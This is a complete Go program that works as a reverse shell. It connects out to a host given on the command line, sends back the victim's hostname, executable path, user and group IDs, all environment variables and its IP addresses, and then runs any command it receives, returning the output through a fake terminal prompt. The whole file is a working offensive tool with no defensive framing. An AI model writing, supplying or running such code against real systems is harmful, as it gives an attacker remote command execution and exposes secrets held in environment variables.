package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	host := flag.String("h", "", "the host:ip to connect back to, e.g. 192.168.0.15:1337")
	udp := flag.Bool("udp", false, "use UDP instead of the default TCP")
	flag.Parse()

	// set the protocol
	protocol := "tcp"
	if *udp {
		protocol = "udp"
	}

	// connect to the host
	conn, err := net.Dial(protocol, *host)

	if err != nil {
		log.Fatal("Connection failed.")
	}

	// gather system hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	executable, err := os.Executable()
	if err != nil {
		executable = "unknown"
	}

	// gather environment variables
	envs := "Environment Variables:\n"
	for _, env := range os.Environ() {
		envs = envs + "- " + env + "\n"
	}

	// gather system IP addresses
	ips := "IP Addresses:\n"
	for _, ip := range getIPs() {
		ips = ips + "- " + ip.String() + "\n"
	}

	// write system details to the connection
	fmt.Fprintf(conn, "Hostname: %s\nLocation: %s\nUID: %d\nGID: %d\n\n%s\n%s\n", hostname, executable, os.Getuid(), os.Getgid(), envs, ips)

	// make a pseudo terminal prompt
	fmt.Fprintf(conn, "\n%s$ ", hostname)

	for {

		message, _ := bufio.NewReader(conn).ReadString('\n')
		message = strings.TrimSuffix(message, "\n")
		splitMessage := strings.Fields(message)
		out, err := exec.Command(splitMessage[0], splitMessage[1:]...).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s%s$ ", out, hostname)

	}
}

func getIPs() []net.IP {
	var ips []net.IP
	ifaces, _ := net.Interfaces()

	// handle err
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		// handle err
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ips = append(ips, ip)
		}
	}
	return ips
}
